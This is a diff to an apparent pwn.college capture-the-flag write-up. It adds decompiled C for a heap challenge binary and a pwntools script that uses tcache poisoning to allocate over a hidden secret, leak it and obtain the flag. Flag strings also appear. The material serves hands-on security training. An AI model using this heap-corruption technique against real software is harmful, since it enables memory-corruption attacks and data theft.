@@ -3178,6 +3178,8 @@ pwn.college{Y1obx4BDBPfdkgWr6FXdTlE7-n5.0FN4MDL4ITM0EzW}
 
 ## Seeking Spanless Secrets (Easy)
 
+### Binary Analysis
+
 ```c title="/challenge/seeking-spanless-secrets-easy :: main()" showLineNumbers
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
@@ -3727,3 +3729,196 @@ pwn.college{s3p743_G7uUAFBNkhZiOvvnjaAR.0lN4MDL4ITM0EzW}
 &nbsp;
 
 ## Seeking Smuggled Secrets (Easy)
+
+### Binary Analysis
+
+```c title="/challenge/seeking-smuggled-secrets-easy" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  unsigned int v3; // eax
+  unsigned int v4; // eax
+  int i; // [rsp+2Ch] [rbp-124h]
+  unsigned int v7; // [rsp+30h] [rbp-120h]
+  unsigned int v8; // [rsp+30h] [rbp-120h]
+  unsigned int v9; // [rsp+30h] [rbp-120h]
+  unsigned int v10; // [rsp+30h] [rbp-120h]
+  unsigned int size; // [rsp+34h] [rbp-11Ch]
+  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
+  char choice[136]; // [rsp+C0h] [rbp-90h] BYREF
+  unsigned __int64 v14; // [rsp+148h] [rbp-8h]
+
+  v14 = __readfsqword(40u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 1uLL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  memset(ptr, 0, sizeof(ptr));
+  for ( i = 0; i <= 15; ++i )
+    byte_429360[i] = rand() % 26 + 97;
+  puts(
+    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
+  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
+  printf("This challenge can manage up to %d unique allocations.\n\n", 16LL);
+  printf("In this challenge, there is a secret stored at %p.\n", byte_429360);
+  puts("If you attempt to malloc an address near where the secret is stored, it will be discarded.\n");
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          while ( 1 )
+          {
+            print_tcache(main_thread_tcache);
+            puts(byte_4035D4);
+            printf("[*] Function (malloc/free/puts/scanf/send_flag/quit): ");
+            __isoc99_scanf("%127s", choice);
+            puts(byte_4035D4);
+            if ( strcmp(choice, "malloc") )
+              break;
+            printf("Index: ");
+            __isoc99_scanf("%127s", choice);
+            puts(byte_4035D4);
+            v7 = atoi(choice);
+            if ( v7 > 15 )
+              __assert_fail("allocation_index < 16", "<stdin>", 279u, "main");
+            printf("Size: ");
+            __isoc99_scanf("%127s", choice);
+            puts(byte_4035D4);
+            size = atoi(choice);
+            printf("[*] allocations[%d] = malloc(%d)\n", v7, size);
+            ptr[v7] = malloc(size);
+            if ( ptr[v7] >= (char *)&secret + 65536 )
+            {
+              printf("[*] allocations[%d] = %p\n", v7, ptr[v7]);
+            }
+            else
+            {
+              puts("Invalid allocation detected: discarded!");
+              ptr[v7] = 0LL;
+            }
+          }
+          if ( strcmp(choice, "free") )
+            break;
+          printf("Index: ");
+          __isoc99_scanf("%127s", choice);
+          puts(byte_4035D4);
+          v8 = atoi(choice);
+          if ( v8 > 15 )
+            __assert_fail("allocation_index < 16", "<stdin>", 303u, "main");
+          printf("[*] free(allocations[%d])\n", v8);
+          free(ptr[v8]);
+        }
+        if ( strcmp(choice, "puts") )
+          break;
+        printf("Index: ");
+        __isoc99_scanf("%127s", choice);
+        puts(byte_4035D4);
+        v9 = atoi(choice);
+        if ( v9 > 15 )
+          __assert_fail("allocation_index < 16", "<stdin>", 316u, "main");
+        printf("[*] puts(allocations[%d])\n", v9);
+        printf("Data: ");
+        puts((const char *)ptr[v9]);
+      }
+      if ( strcmp(choice, "scanf") )
+        break;
+      printf("Index: ");
+      __isoc99_scanf("%127s", choice);
+      puts(byte_4035D4);
+      v10 = atoi(choice);
+      if ( v10 > 15 )
+        __assert_fail("allocation_index < 16", "<stdin>", 329u, "main");
+      if ( (unsigned int)malloc_usable_size(ptr[v10]) )
+      {
+        v3 = malloc_usable_size(ptr[v10]);
+        sprintf(choice, "%%%us", v3);
+        v4 = malloc_usable_size(ptr[v10]);
+        printf("[*] scanf(\"%%%us\", allocations[%d])\n", v4, v10);
+        __isoc99_scanf(choice, ptr[v10]);
+        puts(byte_4035D4);
+      }
+    }
+    if ( strcmp(choice, "send_flag") )
+      break;
+    printf("Secret: ");
+    __isoc99_scanf("%127s", choice);
+    puts(byte_4035D4);
+    if ( !memcmp(choice, byte_429360, 16uLL) )
+    {
+      puts("Authorized!");
+      win();
+    }
+    else
+    {
+      puts("Not authorized!");
+    }
+  }
+  if ( strcmp(choice, "quit") )
+    puts("Unrecognized choice!");
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+### Exploit
+
+```py
+from pwn import *
+
+p = process("/challenge/seeking-smuggled-secrets-easy", level='error')
+
+# 1. Capture the target address
+p.recvuntil(b"secret stored at ")
+addr_hex = p.recvuntil(b".").strip(b".").decode()
+secret_addr = int(addr_hex, 16)
+print(f"[*] Target Secret Address: {hex(secret_addr)}")
+
+p.sendline(b"malloc")
+p.sendline(b"0")
+p.sendline(b"128")
+print(p.recvuntil(b"quit):").decode())
+
+p.sendline(b"malloc")
+p.sendline(b"1")
+p.sendline(b"128")
+print(p.recvuntil(b"quit):").decode())
+
+p.sendline(b"free")
+p.sendline(b"1")
+print(p.recvuntil(b"quit):").decode())
+
+p.sendline(b"free")
+p.sendline(b"0")
+print(p.recvuntil(b"quit):").decode())
+
+p.sendline(b"scanf")
+p.sendline(b"0")
+p.sendline(p64(secret_addr))
+print(p.recvuntil(b"quit):").decode())
+
+p.sendline(b"malloc")
+p.sendline(b"2")
+p.sendline(b"128")
+print(p.recvuntil(b"quit):").decode())
+
+p.sendline(b"malloc")
+p.sendline(b"3")
+p.sendline(b"128")
+print(p.recvuntil(b"quit):").decode())
+
+p.sendline(b"puts")
+p.sendline(b"3")
+leak_text = p.recvuntil(b"Data: ").decode()
+secret = p.recvline().strip().decode()
+print(f"{leak_text}{secret}")
+
+p.sendline(b"send_flag")
+p.sendline(secret.encode())
+print(p.recvuntil(b"}").decode())
+```
+
